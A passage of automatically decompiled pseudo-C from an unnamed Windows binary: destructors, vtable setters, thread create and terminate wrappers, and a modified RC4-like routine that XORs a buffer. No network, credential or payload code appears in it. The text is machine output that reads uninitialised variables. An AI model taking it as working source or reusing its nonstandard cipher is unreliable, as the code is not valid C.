    function_406f8d();
    return result;
}

// Address range: 0x401c7a - 0x401cab
int32_t function_401c7a(void) {
    // 0x401c7a
    int32_t v1; // 0x401c7a
    int32_t result = v1 - 4; // 0x401c7c
    int32_t v2 = *(int32_t *)result; // 0x401c80
    int32_t v3 = v2; // 0x401c8b
    if (v2 == 0) {
        // 0x401c9c
        function_406f8d();
        return result;
    }
    function_4015d4();
    v3--;
    while (v3 != 0) {
        // 0x401c8d
        function_4015d4();
        v3--;
    }
    // 0x401c9c
    function_406f8d();
    return result;
}

// Address range: 0x401cab - 0x401cdf
int32_t function_401cab(void) {
    // 0x401cab
    int32_t v1; // 0x401cab
    int32_t result = v1 - 4; // 0x401cad
    int32_t v2 = *(int32_t *)result; // 0x401cb1
    if (v2 == 0) {
        // 0x401cd0
        function_406f8d();
        return result;
    }
    int32_t v3 = 16 * v2 + v1; // 0x401cbe
    int32_t v4 = v2; // 0x401ccb
    v3 -= 16;
    function_406f1d();
    *(int32_t *)v3 = 0;
    while (v4 != 1) {
        // 0x401cbe
        v4--;
        v3 -= 16;
        function_406f1d();
        *(int32_t *)v3 = 0;
    }
    // 0x401cd0
    function_406f8d();
    return result;
}

// Address range: 0x401cdf - 0x401d0e
int32_t function_401cdf(void) {
    // 0x401cdf
    int32_t v1; // 0x401cdf
    int32_t result = v1 - 4; // 0x401ce1
    int32_t v2 = *(int32_t *)result; // 0x401ce4
    int32_t v3 = v2; // 0x401cee
    if (v2 == 0) {
        // 0x401cff
        function_406f8d();
        return result;
    }
    function_4015fb();
    v3--;
    while (v3 != 0) {
        // 0x401cf0
        function_4015fb();
        v3--;
    }
    // 0x401cff
    function_406f8d();
    return result;
}

// Address range: 0x401d0e - 0x401d40
int32_t function_401d0e(void) {
    // 0x401d0e
    int32_t v1; // 0x401d0e
    int32_t result = v1 - 4; // 0x401d10
    int32_t v2 = *(int32_t *)result; // 0x401d14
    if (v2 == 0) {
        // 0x401d31
        function_406f8d();
        return result;
    }
    int32_t v3 = 12 * v2 + v1; // 0x401d1f
    int32_t v4 = v2; // 0x401d2c
    v3 -= 12;
    function_406f1d();
    *(int32_t *)v3 = 0;
    while (v4 != 1) {
        // 0x401d1f
        v4--;
        v3 -= 12;
        function_406f1d();
        *(int32_t *)v3 = 0;
    }
    // 0x401d31
    function_406f8d();
    return result;
}

// Address range: 0x401d40 - 0x401d72
int32_t function_401d40(void) {
    // 0x401d40
    int32_t v1; // 0x401d40
    int32_t result = v1 - 4; // 0x401d42
    int32_t v2 = *(int32_t *)result; // 0x401d46
    if (v2 == 0) {
        // 0x401d63
        function_406f8d();
        return result;
    }
    int32_t v3 = 24 * v2 + v1; // 0x401d51
    int32_t v4 = v2; // 0x401d5e
    v3 -= 24;
    function_406f1d();
    *(int32_t *)v3 = 0;
    while (v4 != 1) {
        // 0x401d51
        v4--;
        v3 -= 24;
        function_406f1d();
        *(int32_t *)v3 = 0;
    }
    // 0x401d63
    function_406f8d();
    return result;
}

// Address range: 0x401d72 - 0x401d91
int32_t function_401d72(unsigned char a1) {
    // 0x401d72
    int32_t result; // 0x401d72
    function_4047e5(result, result);
    if (a1 % 2 != 0) {
        // 0x401d83
        function_406f8d();
    }
    // 0x401d8a
    return result;
}

// Address range: 0x401d91 - 0x401db0
int32_t function_401d91(unsigned char a1) {
    // 0x401d91
    int32_t result; // 0x401d91
    function_404867(result, result);
    if (a1 % 2 != 0) {
        // 0x401da2
        function_406f8d();
    }
    // 0x401da9
    return result;
}

// Address range: 0x401db0 - 0x401dcf
int32_t function_401db0(unsigned char a1) {
    // 0x401db0
    int32_t result; // 0x401db0
    function_40488b(result, result);
    if (a1 % 2 != 0) {
        // 0x401dc1
        function_406f8d();
    }
    // 0x401dc8
    return result;
}

// Address range: 0x401dcf - 0x401ded
int32_t function_401dcf(unsigned char a1) {
    // 0x401dcf
    int32_t result; // 0x401dcf
    *(int32_t *)result = (int32_t)&g24;
    if (a1 % 2 != 0) {
        // 0x401de1
        function_406f8d();
    }
    // 0x401de6
    return result;
}

// Address range: 0x401ded - 0x401e0b
int32_t function_401ded(unsigned char a1) {
    // 0x401ded
    int32_t result; // 0x401ded
    *(int32_t *)result = (int32_t)&g25;
    if (a1 % 2 != 0) {
        // 0x401dff
        function_406f8d();
    }
    // 0x401e04
    return result;
}

// Address range: 0x401e0b - 0x401e29
int32_t function_401e0b(unsigned char a1) {
    // 0x401e0b
    int32_t result; // 0x401e0b
    *(int32_t *)result = (int32_t)&g26;
    if (a1 % 2 != 0) {
        // 0x401e1d
        function_406f8d();
    }
    // 0x401e22
    return result;
}

// Address range: 0x401e29 - 0x401e48
int32_t function_401e29(unsigned char a1) {
    // 0x401e29
    int32_t result; // 0x401e29
    function_40496c(result, result);
    if (a1 % 2 != 0) {
        // 0x401e3a
        function_406f8d();
    }
    // 0x401e41
    return result;
}

// Address range: 0x401e48 - 0x401e66
int32_t function_401e48(unsigned char a1) {
    // 0x401e48
    int32_t result; // 0x401e48
    *(int32_t *)result = (int32_t)&g28;
    if (a1 % 2 != 0) {
        // 0x401e5a
        function_406f8d();
    }
    // 0x401e5f
    return result;
}

// Address range: 0x401e66 - 0x401e84
int32_t function_401e66(unsigned char a1) {
    // 0x401e66
    int32_t result; // 0x401e66
    *(int32_t *)result = (int32_t)&g29;
    if (a1 % 2 != 0) {
        // 0x401e78
        function_406f8d();
    }
    // 0x401e7d
    return result;
}

// Address range: 0x401e84 - 0x401ea3
int32_t function_401e84(unsigned char a1) {
    // 0x401e84
    function_4049fb();
    if (a1 % 2 != 0) {
        // 0x401e95
        function_406f8d();
    }
    // 0x401e9c
    int32_t result; // 0x401e84
    return result;
}

// Address range: 0x401ea3 - 0x401ec1
int32_t function_401ea3(unsigned char a1) {
    // 0x401ea3
    int32_t result; // 0x401ea3
    *(int32_t *)result = (int32_t)&g31;
    if (a1 % 2 != 0) {
        // 0x401eb5
        function_406f8d();
    }
    // 0x401eba
    return result;
}

// Address range: 0x401ec1 - 0x401edf
int32_t function_401ec1(unsigned char a1) {
    // 0x401ec1
    int32_t result; // 0x401ec1
    *(int32_t *)result = (int32_t)&g32;
    if (a1 % 2 != 0) {
        // 0x401ed3
        function_406f8d();
    }
    // 0x401ed8
    return result;
}

// Address range: 0x401edf - 0x401efd
int32_t function_401edf(unsigned char a1) {
    // 0x401edf
    int32_t result; // 0x401edf
    *(int32_t *)result = (int32_t)&g33;
    if (a1 % 2 != 0) {
        // 0x401ef1
        function_406f8d();
    }
    // 0x401ef6
    return result;
}

// Address range: 0x401efd - 0x401f1b
int32_t function_401efd(unsigned char a1) {
    // 0x401efd
    int32_t result; // 0x401efd
    *(int32_t *)result = (int32_t)&g34;
    if (a1 % 2 != 0) {
        // 0x401f0f
        function_406f8d();
    }
    // 0x401f14
    return result;
}

// Address range: 0x401f1b - 0x401f39
int32_t function_401f1b(unsigned char a1) {
    // 0x401f1b
    int32_t result; // 0x401f1b
    *(int32_t *)result = (int32_t)&g35;
    if (a1 % 2 != 0) {
        // 0x401f2d
        function_406f8d();
    }
    // 0x401f32
    return result;
}

// Address range: 0x401f39 - 0x401f57
int32_t function_401f39(unsigned char a1) {
    // 0x401f39
    int32_t result; // 0x401f39
    *(int32_t *)result = (int32_t)&g36;
    if (a1 % 2 != 0) {
        // 0x401f4b
        function_406f8d();
    }
    // 0x401f50
    return result;
}

// Address range: 0x401f57 - 0x401f75
int32_t function_401f57(unsigned char a1) {
    // 0x401f57
    int32_t result; // 0x401f57
    *(int32_t *)result = (int32_t)&g37;
    if (a1 % 2 != 0) {
        // 0x401f69
        function_406f8d();
    }
    // 0x401f6e
    return result;
}

// Address range: 0x401f75 - 0x401f93
int32_t function_401f75(unsigned char a1) {
    // 0x401f75
    int32_t result; // 0x401f75
    *(int32_t *)result = (int32_t)&g38;
    if (a1 % 2 != 0) {
        // 0x401f87
        function_406f8d();
    }
    // 0x401f8c
    return result;
}

// Address range: 0x401f93 - 0x401fb1
int32_t function_401f93(unsigned char a1) {
    // 0x401f93
    int32_t result; // 0x401f93
    *(int32_t *)result = (int32_t)&g39;
    if (a1 % 2 != 0) {
        // 0x401fa5
        function_406f8d();
    }
    // 0x401faa
    return result;
}

// Address range: 0x401fb1 - 0x401fd0
int32_t function_401fb1(unsigned char a1) {
    // 0x401fb1
    function_404c0e();
    if (a1 % 2 != 0) {
        // 0x401fc2
        function_406f8d();
    }
    // 0x401fc9
    int32_t result; // 0x401fb1
    return result;
}

// Address range: 0x401fd0 - 0x40200b
int32_t function_401fd0(int32_t * a1) {
    // 0x401fd0
    function_401bbd();
    int32_t * v1 = (int32_t *)((int32_t)a1 + 8); // 0x401fe2
    int32_t result; // 0x401fd0
    if (*v1 == 0) {
        // 0x402002
        return result;
    }
    // 0x401fe7
    int32_t v2; // bp-16, 0x401fd0
    int32_t v3 = &v2; // 0x401fef
    for (int32_t i = 0; i < *v1; i++) {
        int32_t v4 = v3;
        *(int32_t *)(v4 - 28) = i;
        v3 = v4 - 32;
        *(int32_t *)v3 = v4 - 24;
        function_401c0a((int32_t)&g322, (int32_t)&g322);
        function_401abc((int32_t)&g322, (int32_t)&g322, (int32_t)&g322, (int32_t)&g322);
    }
    // 0x402002
    return result;
}

// Address range: 0x40200b - 0x40202a
int32_t function_40200b(unsigned char a1) {
    // 0x40200b
    int32_t result; // 0x40200b
    function_404ccf(result, result);
    if (a1 % 2 != 0) {
        // 0x40201c
        function_406f8d();
    }
    // 0x402023
    return result;
}

// Address range: 0x40202a - 0x402052
int32_t function_40202a(unsigned char a1) {
    // 0x40202a
    int32_t result; // 0x40202a
    *(int32_t *)result = (int32_t)&g42;
    function_406f1d();
    if (a1 % 2 != 0) {
        // 0x402044
        function_406f8d();
    }
    // 0x40204b
    return result;
}

// Address range: 0x402052 - 0x402070
int32_t function_402052(unsigned char a1) {
    // 0x402052
    int32_t result; // 0x402052
    *(int32_t *)result = (int32_t)&g43;
    if (a1 % 2 != 0) {
        // 0x402064
        function_406f8d();
    }
    // 0x402069
    return result;
}

// Address range: 0x402070 - 0x40208e
int32_t function_402070(unsigned char a1) {
    // 0x402070
    int32_t result; // 0x402070
    *(int32_t *)result = (int32_t)&g44;
    if (a1 % 2 != 0) {
        // 0x402082
        function_406f8d();
    }
    // 0x402087
    return result;
}

// Address range: 0x40208e - 0x4020ac
int32_t function_40208e(unsigned char a1) {
    // 0x40208e
    int32_t result; // 0x40208e
    *(int32_t *)result = (int32_t)&g45;
    if (a1 % 2 != 0) {
        // 0x4020a0
        function_406f8d();
    }
    // 0x4020a5
    return result;
}

// Address range: 0x4020ac - 0x4020ca
int32_t function_4020ac(unsigned char a1) {
    // 0x4020ac
    int32_t result; // 0x4020ac
    *(int32_t *)result = (int32_t)&g46;
    if (a1 % 2 != 0) {
        // 0x4020be
        function_406f8d();
    }
    // 0x4020c3
    return result;
}

// Address range: 0x4020ca - 0x4020e8
int32_t function_4020ca(unsigned char a1) {
    // 0x4020ca
    int32_t result; // 0x4020ca
    *(int32_t *)result = (int32_t)&g47;
    if (a1 % 2 != 0) {
        // 0x4020dc
        function_406f8d();
    }
    // 0x4020e1
    return result;
}

// Address range: 0x4020e8 - 0x402106
int32_t function_4020e8(unsigned char a1) {
    // 0x4020e8
    int32_t result; // 0x4020e8
    *(int32_t *)result = (int32_t)&g48;
    if (a1 % 2 != 0) {
        // 0x4020fa
        function_406f8d();
    }
    // 0x4020ff
    return result;
}

// Address range: 0x402106 - 0x402125
int32_t function_402106(unsigned char a1) {
    // 0x402106
    function_404e54();
    if (a1 % 2 != 0) {
        // 0x402117
        function_406f8d();
    }
    // 0x40211e
    int32_t result; // 0x402106
    return result;
}

// Address range: 0x402125 - 0x40214a
int32_t function_402125(uint32_t a1) {
    // 0x402125
    int32_t result; // 0x402125
    *(int32_t *)result = (int32_t)&g50;
    *(int32_t *)(result + 4) = (int32_t)&g51;
    if (a1 % 2 != 0) {
        // 0x40213e
        function_406f8d();
    }
    // 0x402143
    return result;
}

// Address range: 0x40214a - 0x402152
int32_t function_40214a(void) {
    // 0x40214a
    return function_402125((int32_t)&g322);
}

// Address range: 0x402152 - 0x402171
int32_t function_402152(uint32_t a1) {
    // 0x402152
    int32_t result; // 0x402152
    function_404f63(result, result);
    if (a1 % 2 != 0) {
        // 0x402163
        function_406f8d();
    }
    // 0x40216a
    return result;
}

// Address range: 0x402171 - 0x402179
int32_t function_402171(void) {
    // 0x402171
    return function_402152((int32_t)&g322);
}

// Address range: 0x402179 - 0x40219e
int32_t function_402179(uint32_t a1) {
    // 0x402179
    int32_t result; // 0x402179
    *(int32_t *)result = (int32_t)&g55;
    *(int32_t *)(result + 4) = (int32_t)&g54;
    if (a1 % 2 != 0) {
        // 0x402192
        function_406f8d();
    }
    // 0x402197
    return result;
}

// Address range: 0x40219e - 0x4021a6
int32_t function_40219e(void) {
    // 0x40219e
    return function_402179((int32_t)&g322);
}

// Address range: 0x4021a6 - 0x4021c5
int32_t function_4021a6(unsigned char a1) {
    // 0x4021a6
    function_40502e();
    if (a1 % 2 != 0) {
        // 0x4021b7
        function_406f8d();
    }
    // 0x4021be
    int32_t result; // 0x4021a6
    return result;
}

// Address range: 0x4021c5 - 0x4021e3
int32_t function_4021c5(unsigned char a1) {
    // 0x4021c5
    int32_t result; // 0x4021c5
    *(int32_t *)result = (int32_t)&g57;
    if (a1 % 2 != 0) {
        // 0x4021d7
        function_406f8d();
    }
    // 0x4021dc
    return result;
}

// Address range: 0x4021e3 - 0x402202
int32_t function_4021e3(unsigned char a1) {
    // 0x4021e3
    function_4050ca();
    if (a1 % 2 != 0) {
        // 0x4021f4
        function_406f8d();
    }
    // 0x4021fb
    int32_t result; // 0x4021e3
    return result;
}

// Address range: 0x402202 - 0x402220
int32_t function_402202(unsigned char a1) {
    // 0x402202
    int32_t result; // 0x402202
    *(int32_t *)result = (int32_t)&g59;
    if (a1 % 2 != 0) {
        // 0x402214
        function_406f8d();
    }
    // 0x402219
    return result;
}

// Address range: 0x402220 - 0x40223f
int32_t function_402220(unsigned char a1) {
    // 0x402220
    function_40527a();
    if (a1 % 2 != 0) {
        // 0x402231
        function_406f8d();
    }
    // 0x402238
    int32_t result; // 0x402220
    return result;
}

// Address range: 0x40223f - 0x40225e
int32_t function_40223f(unsigned char a1) {
    // 0x40223f
    function_4053ae();
    if (a1 % 2 != 0) {
        // 0x402250
        function_406f8d();
    }
    // 0x402257
    int32_t result; // 0x40223f
    return result;
}

// Address range: 0x40225e - 0x40227d
int32_t function_40225e(unsigned char a1) {
    // 0x40225e
    int32_t result; // 0x40225e
    function_4054ac(result, result);
    if (a1 % 2 != 0) {
        // 0x40226f
        function_406f8d();
    }
    // 0x402276
    return result;
}

// Address range: 0x40227d - 0x40229c
int32_t function_40227d(unsigned char a1) {
    // 0x40227d
    int32_t result; // 0x40227d
    function_405580(result, result);
    if (a1 % 2 != 0) {
        // 0x40228e
        function_406f8d();
    }
    // 0x402295
    return result;
}

// Address range: 0x40229c - 0x4022bb
int32_t function_40229c(unsigned char a1) {
    // 0x40229c
    int32_t result; // 0x40229c
    function_40566f(result, result);
    if (a1 % 2 != 0) {
        // 0x4022ad
        function_406f8d();
    }
    // 0x4022b4
    return result;
}

// Address range: 0x4022bb - 0x4022da
int32_t function_4022bb(unsigned char a1) {
    // 0x4022bb
    int32_t result; // 0x4022bb
    function_40579a(result, result);
    if (a1 % 2 != 0) {
        // 0x4022cc
        function_406f8d();
    }
    // 0x4022d3
    return result;
}

// Address range: 0x4022da - 0x4022f8
int32_t function_4022da(unsigned char a1) {
    // 0x4022da
    int32_t result; // 0x4022da
    *(int32_t *)result = (int32_t)&g66;
    if (a1 % 2 != 0) {
        // 0x4022ec
        function_406f8d();
    }
    // 0x4022f1
    return result;
}

// Address range: 0x4022f8 - 0x402313
int32_t function_4022f8(void) {
    // 0x4022f8
    function_406f1d();
    int32_t v1; // 0x4022f8
    *(int32_t *)(v1 + 12) = 0;
    int32_t result = function_406f1d(); // 0x402309
    *(int32_t *)v1 = 0;
    return result;
}

// Address range: 0x402313 - 0x402332
int32_t function_402313(unsigned char a1) {
    // 0x402313
    function_405966();
    if (a1 % 2 != 0) {
        // 0x402324
        function_406f8d();
    }
    // 0x40232b
    int32_t result; // 0x402313
    return result;
}

// Address range: 0x402332 - 0x402351
int32_t function_402332(unsigned char a1) {
    // 0x402332
    function_4059d7();
    if (a1 % 2 != 0) {
        // 0x402343
        function_406f8d();
    }
    // 0x40234a
    int32_t result; // 0x402332
    return result;
}

// Address range: 0x402351 - 0x40236f
int32_t function_402351(unsigned char a1) {
    // 0x402351
    int32_t result; // 0x402351
    *(int32_t *)result = (int32_t)&g69;
    if (a1 % 2 != 0) {
        // 0x402363
        function_406f8d();
    }
    // 0x402368
    return result;
}

// Address range: 0x40236f - 0x40238e
int32_t function_40236f(unsigned char a1) {
    // 0x40236f
    function_405b26();
    if (a1 % 2 != 0) {
        // 0x402380
        function_406f8d();
    }
    // 0x402387
    int32_t result; // 0x40236f
    return result;
}

// Address range: 0x40238e - 0x402453
int32_t function_40238e(int32_t a1) {
    // 0x40238e
    int32_t result; // 0x40238e
    *(int32_t *)result = *(int32_t *)a1;
    *(int32_t *)(result + 4) = *(int32_t *)(a1 + 4);
    function_404094(a1 + 8);
    function_404656(a1 + 16);
    *(int32_t *)(result + 20) = *(int32_t *)(a1 + 20);
    function_404656(a1 + 24);
    *(int32_t *)(result + 28) = *(int32_t *)(a1 + 28);
    *(int32_t *)(result + 32) = *(int32_t *)(a1 + 32);
    function_404656(a1 + 36);
    *(int32_t *)(result + 40) = *(int32_t *)(a1 + 40);
    function_404656(a1 + 44);
    function_404656(a1 + 48);
    *(int32_t *)(result + 52) = *(int32_t *)(a1 + 52);
    function_404656(a1 + 56);
    *(int32_t *)(result + 60) = *(int32_t *)(a1 + 60);
    *(int32_t *)(result + 64) = *(int32_t *)(a1 + 64);
    *(int32_t *)(result + 68) = *(int32_t *)(a1 + 68);
    *(int32_t *)(result + 72) = *(int32_t *)(a1 + 72);
    *(int32_t *)(result + 76) = *(int32_t *)(a1 + 76);
    function_404094(a1 + 80);
    return result;
}

// Address range: 0x402453 - 0x40246e
int32_t function_402453(void) {
    // 0x402453
    int32_t v1; // 0x402453
    function_40246e(v1);
    function_404081();
    return function_413c16();
}

// Address range: 0x40246e - 0x402489
int32_t function_40246e(int32_t a1) {
    // 0x40246e
    int32_t v1; // 0x40246e
    if (v1 != 0) {
        // 0x402477
        function_402489();
    }
    // 0x40247d
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x402489 - 0x4024bb
int32_t function_402489(void) {
    // 0x402489
    int32_t v1; // 0x402489
    int32_t result = v1 - 4; // 0x40248b
    int32_t v2 = *(int32_t *)result; // 0x40248e
    int32_t v3 = v2; // 0x402499
    if (v2 == 0) {
        // 0x4024ac
        function_406f8d();
        return result;
    }
    function_404081();
    v3--;
    while (v3 != 0) {
        // 0x40249d
        function_404081();
        v3--;
    }
    // 0x4024ac
    function_406f8d();
    return result;
}

// Address range: 0x4024bb - 0x402612
int32_t function_4024bb(int32_t a1) {
    // 0x4024bb
    int32_t v1; // 0x4024bb
    int32_t * v2 = (int32_t *)(v1 + 12); // 0x4024cd
    int32_t result; // 0x4024bb
    if (*v2 == 0) {
        // 0x40260c
        return result;
    }
    int32_t * v3 = (int32_t *)(v1 + 16); // 0x4024d6
    if (*v3 == 0) {
        // 0x40260c
        return result;
    }
    int32_t v4 = v1 + 4; // 0x4024df
    int32_t * v5 = (int32_t *)v4; // 0x4024df
    *v5 = 0;
    int32_t * v6 = (int32_t *)v1; // 0x4024e4
    *v6 = 0;
    int32_t v7 = *v2; // 0x4024e6
    int32_t v8; // 0x4024bb
    *(char *)v7 = *(char *)&v8;
    int32_t v9 = v7 + 1; // 0x4024f3
    *v6 = v9;
    while (v9 < 256) {
        // 0x4024e6
        v7 = *v2;
        *(char *)(v9 % 256 + v7) = *(char *)&v8;
        v9 = v7 + 1;
        *v6 = v9;
    }
    // 0x4024fd
    *v6 = 0;
    char * v10 = (char *)v4;
    uint32_t v11 = 0;
    int32_t v12 = *v2; // 0x40250c
    uint32_t v13 = (char)v11 < 250 ? v11 : v11 + 6;
    char v14 = *(char *)(v13 % 256 + *v3); // 0x402514
    char * v15 = (char *)(v11 % 256 + v12); // 0x402518
    uint32_t v16 = (int32_t)*v15 + (int32_t)v14 + *v5; // 0x40251e
    *v5 = v16;
    *v15 = *v15 ^ *(char *)(v16 % 256 + v12);
    int32_t v17 = *v2; // 0x40252d
    char * v18 = (char *)(v17 + (int32_t)*v10); // 0x40253a
    *v18 = *v18 ^ *(char *)(v17 + (int32_t)*(char *)&v8);
    int32_t v19 = *v2; // 0x40253d
    int32_t v20 = (int32_t)*(char *)&v8; // 0x402544
    char * v21 = (char *)(v19 + v20); // 0x40254a
    *v21 = *v21 ^ *(char *)(v19 + (int32_t)*v10);
    int32_t v22 = v20 + 1; // 0x40254f
    *v6 = v22;
    while (v22 < 256) {
        // 0x402502
        v11 = v22;
        v12 = *v2;
        v13 = (char)v11 < 250 ? v11 : v11 + 6;
        v14 = *(char *)(v13 % 256 + *v3);
        v15 = (char *)(v11 % 256 + v12);
        v16 = (int32_t)*v15 + (int32_t)v14 + *v5;
        *v5 = v16;
        *v15 = *v15 ^ *(char *)(v16 % 256 + v12);
        v17 = *v2;
        v18 = (char *)(v17 + (int32_t)*v10);
        *v18 = *v18 ^ *(char *)(v17 + (int32_t)*(char *)&v8);
        v19 = *v2;
        v20 = (int32_t)*(char *)&v8;
        v21 = (char *)(v19 + v20);
        *v21 = *v21 ^ *(char *)(v19 + (int32_t)*v10);
        v22 = v20 + 1;
        *v6 = v22;
    }
    // 0x402559
    *v6 = 0;
    *v5 = 0;
    int32_t * v23 = (int32_t *)(v1 + 8); // 0x402560
    if (*v23 == 0) {
        // 0x40260c
        return 0;
    }
    // 0x402569
    v8 = 0;
    int32_t result2 = 0; // 0x402569
    uint32_t v24 = 1; // 0x40256e
    *v6 = v24;
    int32_t v25 = *v2; // 0x402573
    char * v26 = (char *)(v25 + v24 % 256); // 0x402579
    char v27 = *v26; // 0x402579
    int32_t v28 = v27; // 0x40257c
    uint32_t v29 = *v5 + v28; // 0x40257f
    *v5 = v29;
    char v30 = *(char *)(v29 % 256 + v25); // 0x40258b
    *v26 = v30;
    int32_t v31 = v30; // 0x402595
    *(char *)(*v2 + (int32_t)*v10) = v27;
    uint32_t v32 = *v5; // 0x4025a3
    int32_t v33 = *v2; // 0x4025ac
    unsigned char v34 = *(char *)((v32 / 8 ^ 32 * v32) % 256 + v33); // 0x4025bd
    char v35 = *(char *)(v33 + (v31 + v28) % 256); // 0x4025e5
    char v36 = *(char *)((v32 + v31) % 256 + v33); // 0x4025f1
    unsigned char v37 = v35 + *(char *)((2 * (int32_t)v34 & 254 ^ 170) + v33) ^ v36; // 0x4025f1
    int32_t v38 = v37; // 0x4025f1
    char * v39 = (char *)(result2 + a1); // 0x4025f7
    *v39 = *v39 ^ v37;
    result2++;
    *v6 = v38 + 1;
    v8 = v38;
    while (result2 < *v23) {
        // 0x40256b
        v24 = v38 + 1;
        *v6 = v24;
        v25 = *v2;
        v26 = (char *)(v25 + v24 % 256);
        v27 = *v26;
        v28 = v27;
        v29 = *v5 + v28;
        *v5 = v29;
        v30 = *(char *)(v29 % 256 + v25);
        *v26 = v30;
        v31 = v30;
        *(char *)(*v2 + (int32_t)*v10) = v27;
        v32 = *v5;
        v33 = *v2;
        v34 = *(char *)((v32 / 8 ^ 32 * v32) % 256 + v33);
        v35 = *(char *)(v33 + (v31 + v28) % 256);
        v36 = *(char *)((v32 + v31) % 256 + v33);
        v37 = v35 + *(char *)((2 * (int32_t)v34 & 254 ^ 170) + v33) ^ v36;
        v38 = v37;
        v39 = (char *)(result2 + a1);
        *v39 = *v39 ^ v37;
        result2++;
        *v6 = v38 + 1;
        v8 = v38;
    }
    // 0x40260c
    return result2;
}

// Address range: 0x402612 - 0x4026c6
int32_t function_402612(int32_t a1) {
    int32_t v1 = a1;
    int32_t v2; // 0x402612
    int32_t * v3 = (int32_t *)(v2 + 8); // 0x402620
    uint32_t v4 = *v3; // 0x402620
    int32_t * v5 = (int32_t *)(v2 + 4); // 0x402623
    v1 = a1;
    int32_t result = v4; // 0x402626
    int32_t v6; // 0x402612
    bool v7; // 0x402612
    if (v4 >= *v5) {
        int32_t v8 = *(int32_t *)(v2 + 12) * (v4 + 1); // 0x40262f
        int32_t v9 = function_406fa7(); // 0x402652
        int32_t v10 = 0; // 0x40265b
        if (v9 != 0) {
            // 0x40265d
            *(int32_t *)v9 = v8;
            v10 = v9 + 4;
        }
        // 0x40266c
        result = 0;
        if (*v3 != 0) {
            int32_t v11 = v7 ? -4 : 4; // 0x40268b
            int32_t v12 = 0; // 0x402687
            int32_t v13 = 0; // 0x402612
            int32_t v14 = v13 + v10; // 0x40267f
            int32_t v15 = v13 + v12; // 0x402682
            v12++;
            *(int32_t *)v14 = *(int32_t *)v15;
            int32_t v16 = v14 + v11; // 0x40268b
            int32_t v17 = v15 + v11; // 0x40268b
            *(int32_t *)v16 = *(int32_t *)v17;
            *(int32_t *)(v16 + v11) = *(int32_t *)(v17 + v11);
            v13 += 12;
            while (v12 < *v3) {
                // 0x40267d
                v14 = v13 + v10;
                v15 = v13 + v12;
                v12++;
                *(int32_t *)v14 = *(int32_t *)v15;
                v16 = v14 + v11;
                v17 = v15 + v11;
                *(int32_t *)v16 = *(int32_t *)v17;
                *(int32_t *)(v16 + v11) = *(int32_t *)(v17 + v11);
                v13 += 12;
            }
            // 0x40269e
            function_406f8d();
            result = *v3;
        }
        // 0x4026a9
        *(int32_t *)v2 = v10;
        *v5 = v8;
        v6 = v10;
    }
    int32_t v18 = 12 * result + v6; // 0x4026b7
    *(int32_t *)v18 = v1;
    int32_t v19 = v7 ? -4 : 4; // 0x4026b9
    int32_t v20 = v18 + v19; // 0x4026b9
    int32_t v21 = v19 + (int32_t)&v1; // 0x4026b9
    *(int32_t *)v20 = *(int32_t *)v21;
    *(int32_t *)(v20 + v19) = *(int32_t *)(v21 + v19);
    *v3 = *v3 + 1;
    return result;
}

// Address range: 0x4026c6 - 0x4026e3
int32_t function_4026c6(void) {
    // 0x4026c6
    int32_t v1; // 0x4026c6
    if (v1 != 0) {
        // 0x4026cf
        function_406f8d();
    }
    // 0x4026d7
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x4026e3 - 0x402727
int32_t function_4026e3(void) {
    // 0x4026e3
    int32_t v1; // 0x4026e3
    if (v1 == 0) {
        // 0x40271a
        *(int32_t *)v1 = 0;
        *(int32_t *)(v1 + 8) = 0;
        *(int32_t *)(v1 + 4) = 0;
        return 0;
    }
    int32_t v2 = *(int32_t *)(v1 - 4); // 0x4026f5
    int32_t v3 = v2; // 0x4026ff
    if (v2 == 0) {
        // 0x402713
        function_406f8d();
        // 0x40271a
        *(int32_t *)v1 = 0;
        *(int32_t *)(v1 + 8) = 0;
        *(int32_t *)(v1 + 4) = 0;
        return 0;
    }
    function_404081();
    v3--;
    while (v3 != 0) {
        // 0x402701
        function_404081();
        v3--;
    }
    // 0x402713
    function_406f8d();
    // 0x40271a
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
    return 0;
}

// Address range: 0x402727 - 0x402746
int32_t function_402727(void) {
    // 0x402727
    int32_t result; // 0x402727
    if (result == 0) {
        // 0x402744
        return result;
    }
    // 0x402731
    if (*(char *)(result + 4) != 0) {
        // 0x402737
        function_401014(result);
        *(int32_t *)result = 0;
    }
    // 0x402744
    return result;
}

// Address range: 0x402746 - 0x402771
int32_t function_402746(int32_t lpStartAddress, int32_t * lpParameter) {
    // 0x402746
    int32_t v1; // 0x402746
    int32_t * threadHandle = CreateThread(NULL, 0, (int32_t (*)(int32_t *))lpStartAddress, lpParameter, 0, (int32_t *)(v1 + 4)); // 0x40275b
    *(int32_t *)v1 = (int32_t)threadHandle;
    return threadHandle != NULL;
}

// Address range: 0x402771 - 0x402790
int32_t function_402771(void) {
    // 0x402771
    int32_t v1; // 0x402771
    int32_t * hThread = (int32_t *)v1;
    int32_t handleClosed; // 0x402771
    if (v1 != 0) {
        // 0x402779
        TerminateThread(hThread, 0);
        handleClosed = CloseHandle(hThread);
    }
    // 0x40278b
    *hThread = 0;
    return handleClosed;
}

// Address range: 0x402790 - 0x4027c6
int32_t function_402790(int32_t a1) {
    // 0x402790
    function_404656(a1);
    function_404656(a1 + 4);
    function_404656(a1 + 8);
    int32_t result; // 0x402790
    *(int32_t *)(result + 12) = *(int32_t *)(a1 + 12);
    return result;
}

// Address range: 0x4027c6 - 0x402820
int32_t function_4027c6(int32_t a1) {
    // 0x4027c6
    function_4043c7(a1);
    function_4043c7(a1 + 4);
    function_4043c7(a1 + 8);
    function_4043c7(a1 + 12);
    int32_t result; // 0x4027c6
    *(int32_t *)(result + 16) = *(int32_t *)(a1 + 16);
    *(int32_t *)(result + 20) = *(int32_t *)(a1 + 20);
    *(int32_t *)(result + 24) = *(int32_t *)(a1 + 24);
    *(int32_t *)(result + 28) = *(int32_t *)(a1 + 28);
    *(int32_t *)(result + 32) = *(int32_t *)(a1 + 32);
    return result;
}

// Address range: 0x402820 - 0x40283b
int32_t function_402820(void) {
    // 0x402820
    int32_t v1; // 0x402820
    if (v1 != 0) {
        // 0x402829
        function_401c4b();
    }
    // 0x40282f
    *(int32_t *)v1 = 0;
    *(int32_t *)(v1 + 8) = 0;
    *(int32_t *)(v1 + 4) = 0;
